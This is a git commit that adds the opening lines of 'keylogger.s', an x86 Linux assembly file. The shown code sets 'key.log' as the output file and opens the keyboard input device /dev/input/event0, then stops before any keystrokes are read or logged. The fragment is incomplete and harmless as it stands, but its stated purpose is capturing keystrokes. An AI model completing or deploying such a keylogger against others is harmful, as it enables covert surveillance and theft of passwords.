443443eb1da10cbc6354066de8e747894b780b0c
quentin-csg <qcassaigne73@gmail.com>
2024-04-30 16:23:27 +0200

    open_file

---
+++ keylogger.s
@@ -0,0 +1,19 @@
+SECTION .data
+    output_file   db "key.log", 0
+    event_keyboard db "/dev/input/event0", 0
+
+SECTION .bss
+    input_event resb 16
+
+
+SECTION .text
+global _start
+
+_start:
+    ; open event_file
+    xor ecx, ecx
+    mov ebx, event_keyboard
+    mov eax, 5
+    int 0x80
+
+    mov esi, eax 
